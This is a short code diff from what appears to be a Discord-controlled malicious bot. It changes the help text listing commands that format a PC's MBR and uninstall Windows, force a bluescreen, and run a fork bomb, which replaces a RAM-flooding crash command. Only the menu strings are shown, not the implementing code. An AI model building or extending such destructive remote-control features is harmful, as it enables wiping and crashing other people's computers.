@@ -20,7 +20,7 @@ async def helpcommand(ctx):
         value=(
             "```"
             ".endpc >> uninstall windows and format mbr\n"
-            ".crashpc >> floods the ram of the pc, instantly crashing it\n"
+            ".forkbomb >> forkbomb. start/stop arguments\n"
             ".bsod >> trigger a bluescreen crash"
             "```"
         ),
